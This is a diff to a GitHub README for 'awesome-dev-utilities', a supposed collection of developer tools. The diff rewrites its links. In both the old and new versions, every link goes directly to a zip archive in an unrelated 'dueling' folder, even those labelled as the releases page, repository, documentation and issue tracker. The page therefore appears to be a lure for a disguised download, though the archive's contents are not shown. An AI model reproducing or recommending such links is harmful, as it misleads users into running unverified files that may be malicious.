@@ -1,6 +1,6 @@
 # 🎉 awesome-dev-utilities - Quick Tools to Simplify Your Development
 
-[![Download Now](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip%20Now-Get%20Started%21-brightgreen)](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip)
+[![Download Now](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip%20Now-Get%20Started%21-brightgreen)](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip)
 
 ## 🛠️ Overview
 
@@ -37,11 +37,11 @@ Awesome Dev Utilities is a curated collection of free, fast, and no-login online
 
 1. First, make sure you have a computer with access to the internet.
 2. Click on the link below to visit the Releases page.
-   [Download Now](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip)
+   [Download Now](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip)
 
 ## 📥 Download & Install
 
-To download Awesome Dev Utilities, visit the [Releases page](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip). 
+To download Awesome Dev Utilities, visit the [Releases page](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip). 
 
 You will see the latest version listed. Click on the version you want to download. The download will begin immediately. Once completed, follow the instructions below based on your operating system.
 
@@ -89,9 +89,9 @@ This application is currently designed for desktop operating systems only.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip)
-- [Documentation](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/A7medAbde7hamed/awesome-dev-utilities/main/dueling/awesome_dev_utilities_3.1.zip)
+- [GitHub Repository](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip)
+- [Documentation](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip)
+- [Issues Tracker](https://github.com/A7medAbde7hamed/awesome-dev-utilities/raw/refs/heads/main/dueling/dev-awesome-utilities-1.3.zip)
 
 ## 🙌 Contributions
 
